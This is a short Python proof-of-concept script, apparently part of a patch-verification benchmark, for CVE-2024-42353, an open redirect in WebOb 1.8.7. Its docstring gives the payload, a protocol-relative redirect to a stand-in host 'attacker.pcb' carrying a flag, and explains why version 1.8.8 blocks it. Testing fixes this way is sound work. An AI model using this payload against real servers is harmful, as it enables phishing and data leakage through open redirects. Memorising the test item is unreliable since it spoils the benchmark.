"""
Original PoC for CVE-2024-42353 (the vuln the 1.8.8 patch was meant to fix).

Payload: a protocol-relative redirect target  //attacker.pcb/<FLAG>.
- On V0 (WebOb 1.8.7): _make_location_absolute passes it to urljoin as-is ->
  Location: http://attacker.pcb/<FLAG>  (OPEN redirect, flag escapes).
- On V1 (WebOb 1.8.8): the CVE-2024-42353 fix rewrites a leading "//" to
  "/%2f...", so urljoin keeps it same-origin -> BLOCKED (no attacker host).

Run: PCB_FLAG=... V0_URL=... V1_URL=... python original_poc.py
"""
import os
import sys
from oracle import probe

flag = os.environ.get("PCB_FLAG", "PCBFLAG_LOCAL_TEST")
v0 = os.environ.get("V0_URL", "http://127.0.0.1:45210")
v1 = os.environ.get("V1_URL", "http://127.0.0.1:45211")

r0 = probe(v0, flag, "original")
r1 = probe(v1, flag, "original")
print("original@V0:", r0)
print("original@V1:", r1)

ok = r0["reaches_attacker"] and not r1["reaches_attacker"]
print("ORIGINAL PoC (reaches V0, blocked V1):", "PASS" if ok else "FAIL")
sys.exit(0 if ok else 1)
